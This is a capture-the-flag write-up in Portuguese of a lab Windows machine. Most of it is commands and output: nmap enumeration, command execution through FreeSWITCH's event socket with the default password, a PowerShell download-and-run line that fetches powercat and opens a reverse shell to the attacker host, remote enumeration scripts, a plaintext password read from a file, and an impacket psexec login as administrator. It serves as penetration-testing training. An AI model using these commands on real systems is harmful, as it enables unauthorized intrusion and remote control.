CyberCup - Networked

# CyberCup - Networked

## Enumeração

- Executado nmap e enumerados os seguintes serviços

```
# Nmap 7.80 scan initiated Sat Jun 27 23:41:13 2020 as: nmap -sC -sV -Pn -oA quick 10.2.0.132
Nmap scan report for 10.2.0.132
Host is up (0.022s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE          VERSION
135/tcp  open  msrpc            Microsoft Windows RPC
139/tcp  open  netbios-ssn      Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DESKTOP-U5E0RVF, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:ff:07:76 (VMware)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-28T02:41:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 27 23:41:35 2020 -- 1 IP address (1 host up) scanned in 21.74 seconds
```
  
- Aps identificar  que o software FreeSwich encontrava-se em execução, realizado busca no searchsploit, que era compativel com a versão identificada

```
zurc@kali:/dcruz/fiap/cybercup/networked/scan$ searchsploit freeswitch
----------------------------------------------------------------------------------- ---------------------
  Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                           | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                              | windows/remote/47799.txt
----------------------------------------------------------------------------------- ---------------------

```
  
- Ao invés de executar o exploit, interagido com a aplicação via telnet, realizando as execuções de comando na medida que era realizada a exploração

  - Autenticação: *auth ClueCon*
  - Execução de comando *api system <Comando>*, onde os seguintes comandos foram utilizados
  
- Através destes comandos foi realizada a execução do download do powercat.ps1 e envio de shell reversa para obtenção do user.txt a partir da conta **mario**

```
zurc@kali:/dcruz/fiap/cybercup$ telnet 10.2.0.132 8021
Trying 10.2.0.132...
Connected to 10.2.0.132.
Escape character is '^]'.
Content-Type: auth/request

auth ClueCon

Content-Type: command/reply
Reply-Text: +OK accepted

api system powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://10.2.0.129/powercat.ps1');powercat -c  10.2.0.129 -p 4443 -e cmd

```

```
C:\Users\mario\Desktop> type user.txt
fr9jc6sap348ckpoqw2a84nc8z0
```
  
  

## Escalação

- A partir da shell reversa, executado script jaws-enum.ps1, onde foi possível enumerar usuários, arquivos e serviços na maquina, onde foi possível identificar o user networked, membro dos administradores locais.

```
C:\Program Files\FreeSWITCH>powershell -c IEX(New-object system.net.webclient).DownloadString('http://10.2.0.129/jaws-enum.ps1')                                                                                                           
powershell -c IEX(New-object system.net.webclient).DownloadString('http://10.2.0.129/jaws-enum.ps1')                                                                                                                                                                                                                                                                  
Running J.A.W.S. Enumeration                                                                                                                                                                                                               
        - Gathering User Information                                                                                         
        - Gathering Processes, Services and Scheduled Tasks                                                                   
        - Gathering Installed Software                                                                                       
        - Gathering File System Information                                                                                   
        - Looking for Simple Priv Esc Methods                                                                                                                                                                                              
############################################################                                                                 
##     J.A.W.S. (Just Another Windows Enum Script)        ##                                                                
##                                                        ##                                                                
##           https://github.com/411Hall/JAWS              ##
##                                                        ##
############################################################

Windows Version: Microsoft Windows 10 Pro
Architecture: AMD64
Hostname: DESKTOP-U5E0RVF
Current User: mario
Current Time\Date: 06/28/2020 05:31:48

-----------------------------------------------------------
  Users                                                                                                                      
-----------------------------------------------------------                                                                                                                                                                                                                                                                                               
Username: Administrador                                                                                                       
Groups:   Administradores                                                                                                     
----------                                                                                                                   
Username: Convidado                                                                                                           
Groups:   Convidados                                                                                                         
----------                                                                                                                   
Username: DefaultAccount                                                                                                     
Groups:   System Managed Accounts Group                                                                                       
----------                                                                                                                   Username: mario                                                                                                               
Groups:   Administradores Usurios                                                                                             
----------                                                                                                                   Username: networked                                                                                                           Groups:   Administradores                                                                                                     ----------                                                                                                                   Username: WDAGUtilityAccount                                                                                                 Groups:                         

-----------------------------------------------------------                                                                    Installed Patches                                                                                                             -----------------------------------------------------------                                                                                                                                                                                 
HotFixID  InstalledOn                                                                                                         --------  -----------                                                                                                         KB4545706 30/03/2020 00:00:00                                                                                                 KB4552455 30/03/2020 00:00:00          

-----------------------------------------------------------                                                                    Files with Full Control and Modify Access                                                                                     
-----------------------------------------------------------                                                                                                                                                                                
C:\Program Files\FreeSWITCH\conf\extensions.conf                                                              
C:\Program Files\FreeSWITCH\conf\README_IMPORTANT.txt                                                        
C:\Program Files\FreeSWITCH\fonts\OFL.txt                                                 
C:\Program Files\FreeSWITCH\htdocs\portal\index.html                                                          
C:\Program Files\FreeSWITCH\htdocs\license.txt                                                                
C:\Program Files\FreeSWITCH\OPENH264_BINARY_LICENSE.txt                                                                                                                                                                                  
C:\Users\mario\Desktop\user.txt                                                           /                                                                                                                                                
C:\Users\mario\Desktop\user.txt                                                                                                                                                                                                            
C:\Users\networked\Desktop\root.txt                                                                                                                                                                                                        
C:\Users\networked\Desktop\root.txt                                                                                                                                                                                                        
C:\Users\networked\Desktop\root.txt                                                                                                                                                                                                        
C:\Users\Public\Documents\notes.txt                                                                                                                                                                                                        
C:\Users\Public\Documents\notes.txt                                                                                                                                                                                                        
C:\Users\Public\Documents\notes.txt                                                                                                                                                                                                        
C:\Users\Public\Documents\notes.txt                                                                                                                                                                                                        
C:\Users\Public\Documents\notes.txt                                                                                                                                                                                                        
                                              
-----------------------------------------------------------
  10 Last Modified Files in C:\User
-----------------------------------------------------------
C:\Users\mario\Searches\winrt--{S-1-5-21-3786000011-2480701208-1296004378-1002}-.searchconnector-ms
C:\Users\mario\Pictures
C:\Users\mario\Pictures\Camera Roll
C:\Users\networked\Desktop\root.txt
C:\Users\mario\Desktop
C:\Users\mario\Desktop\user.txt
C:\Users\Public\Documents
C:\Users\Public\Documents\notes.txt
C:\Users\mario
C:\Users\mario\OneDrive

```

- Dentro do últimos arquivos modificados, o arquivo C:\Users\Public\Documents\notes.txt foi encontrado contendo uma possível senha

```
C:\Program Files\FreeSWITCH>type  C:\Users\Public\Documents\notes.txt
type  C:\Users\Public\Documents\notes.txt
don't forget: calcuta901
C:\Program Files\FreeSWITCH>
```

- Utilizando o impacket-psexec.py, ao tentar se autenticar como networked, um dos administradores locais, obtido shell sucesso, permitindo a leitura da flag root.txt

```
zurc@kali:/dcruz/fiap/cybercup/networked/scan$ python3 /usr/share/doc/python3-impacket/examples/psexec.py networked:calcuta901@10.2.0.132
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.2.0.132.....
[*] Found writable share ADMIN$
[*] Uploading file DAyniquH.exe
[*] Opening SVCManager on 10.2.0.132.....
[*] Creating service RuOI on 10.2.0.132.....
[*] Starting service RuOI.....
[!] Press help for extra shell commands
Microsoft Windows [vers╞o 10.0.19041.172]
(c) 2020 Microsoft Corporation. Todos os direitos reservados.

C:\Windows\system32>type C:\Users\networked\Desktop\root.txt
dfoepc84mdksp0anaue84hdk39asd02ekda09ap
```
